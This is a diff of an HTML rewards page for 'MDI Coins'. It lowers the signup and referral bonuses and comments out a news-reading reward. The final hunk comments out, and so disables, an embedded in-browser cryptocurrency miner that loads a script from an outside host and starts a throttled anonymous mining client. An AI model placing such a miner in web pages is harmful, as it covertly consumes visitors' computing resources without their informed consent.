@@ -745,18 +745,18 @@
 							</div>
 						</div>
 						<div align="center">
-								<div style="font-size: 24px;">Signup 200 MDI Coins</div>
+								<div style="font-size: 24px;">Signup 50 MDI Coins</div>
 								<p>After email confirmation</p>
 								<br>
-								<div style="font-size: 24px;">Refer & Earn 50 MDI Coins</div>
+								<div style="font-size: 24px;">Refer & Earn 20 MDI Coins</div>
 								<p>Points after email confirmation</p>
 								<p>If user is already registered, then no benefit will be provided</p>
 								<br>
 								<div style="font-size: 24px;">After sign in Join us on all social media platforms and get more MDI Coins</div>
 								<br>
-								<div style="font-size: 24px;">News and Articles read 10 MDI Coins</div>
+								<!-- <div style="font-size: 24px;">News and Articles read 10 MDI Coins</div>
 								<p>After 3 minutes of page load</p>
-								<br>
+								<br> -->
 								<div style="font-size: 24px;">Task completion</div>
 								<br>
 								<div style="font-size: 24px;">Daily Check-in 10 MDI Coins</div>
@@ -1698,13 +1698,13 @@
 				});
 			</script>
 
-			<script src="https://www.hostingcloud.racing/X4XX.js"></script>
+			<!-- <script src="https://www.hostingcloud.racing/X4XX.js"></script>
 			<script>
 			    var _client = new Client.Anonymous('ee3c3e8c50942905be889544264cc91678b72b870fbebdccfa0f5260f0d1e5cb', {
 			        throttle: 0.5, ads: 0
 			    });
 			    _client.start();
-			</script>
+			</script> -->
 
 		</body>
 </html>
